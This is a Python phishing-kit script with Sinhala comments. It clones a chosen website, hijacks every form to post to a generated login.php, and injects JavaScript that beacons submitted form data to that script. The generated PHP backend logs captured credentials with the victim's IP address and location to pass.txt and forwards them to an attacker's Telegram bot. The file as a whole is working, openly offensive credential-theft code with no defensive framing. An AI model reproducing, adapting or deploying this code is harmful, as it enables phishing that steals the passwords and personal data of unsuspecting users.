import requests
from bs4 import BeautifulSoup
import os
from colorama import Fore
from dotenv import load_dotenv  # අලුතින් එකතු කරා

# .env එකේ තියෙන දත්ත ලෝඩ් කරගන්න
load_dotenv()

def start_cloning(url):
    # .env එකෙන් Token සහ Chat ID ගන්න
    bot_token = os.getenv("BOT_TOKEN")
    chat_id = os.getenv("CHAT_ID")

    base_dir = os.getcwd()
    save_path = os.path.join(base_dir, 'cloned_web')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    try:
        print(f"{Fore.CYAN}[*] Fetching content from: {url}")
        response = requests.get(url, headers=headers, timeout=15)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')

            # --- 1. Form Hijacking ---
            for form in soup.find_all('form'):
                form['action'] = 'login.php'
                form['method'] = 'POST'
                if form.get('onsubmit'):
                    del form['onsubmit']

            # --- 2. JavaScript Stealth Injector ---
            script_tag = soup.new_tag("script")
            script_tag.string = """
            document.addEventListener('submit', function(e) {
                var formData = new FormData(e.target);
                navigator.sendBeacon('login.php', formData);
            });
            """
            if soup.body:
                soup.body.append(script_tag)
            else:
                soup.append(script_tag)

            if not os.path.exists(save_path):
                os.makedirs(save_path)

            with open(os.path.join(save_path, 'index.html'), "w", encoding='utf-8') as f:
                f.write(soup.prettify())

            # --- 3. Advanced PHP Backend (Injected Secrets) ---
            login_php_path = os.path.join(save_path, 'login.php')
            with open(login_php_path, "w") as f:
                # මෙතනදී python variables (bot_token, chat_id) පාවිච්චි කරලා PHP එක හදනවා
                php_code = f"""<?php
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {{
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
}} elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {{
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}} else {{
    $ip = $_SERVER['REMOTE_ADDR'];
}}

$data = !empty($_POST) ? $_POST : json_decode(file_get_contents('php://input'), true);

if (!empty($data)) {{
    $date = date('Y-m-d H:i:s');
    $details = json_decode(@file_get_contents("http://ip-api.com/json/{{$ip}}"));
    $country = isset($details->country) ? $details->country : "Unknown";
    $city = isset($details->city) ? $details->city : "Unknown";
    $isp = isset($details->isp) ? $details->isp : "Unknown";

    $log_msg = "--- HIT [{{$date}}] | IP: {{$ip}} | Loc: {{$city}}, {{$country}} | ISP: {{$isp}} ---\\n";

    $tg_msg = "💀 *DARK-SHELL REAL-HIT* 💀\\n\\n";
    $tg_msg .= "📍 *Real IP:* `{{$ip}}`\\n";
    $tg_msg .= "🌍 *Location:* {{$city}}, {{$country}}\\n";
    $tg_msg .= "🏢 *ISP:* {{$isp}}\\n\\n";
    $tg_msg .= "🔑 *Captured Credentials:*\\n";

    foreach($data as $key => $value) {{
        $log_msg .= "{{$key}}={{$value}}\\n";
        $tg_msg .= "👉 `{{$key}}` : `{{$value}}`\\n";
    }}

    file_put_contents('pass.txt', $log_msg . "------------------\\n", FILE_APPEND);

    // --- TELEGRAM NOTIFICATION (Injected from Python) ---
    $botToken = "{bot_token}";
    $chatId = "{chat_id}";
    $tg_url = "https://api.telegram.org/bot{{$botToken}}/sendMessage";

    $params = [
        'chat_id' => $chatId,
        'text' => $tg_msg,
        'parse_mode' => 'Markdown'
    ];

    @file_get_contents($tg_url . "?" . http_build_query($params));
}}

header('Location: ' . $_SERVER['HTTP_REFERER']);
exit();
?>"""
                f.write(php_code)

            pass_file = os.path.join(save_path, 'pass.txt')
            with open(pass_file, 'a'): pass
            os.chmod(pass_file, 0o777)

            print(Fore.GREEN + f"\n[✔] Shadow-Force: Attack Engine Deployed Successfully!")
        else:
            print(Fore.RED + f"\n[-] Target URL error: Status Code {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"\n[-] Error during deployment: {e}")
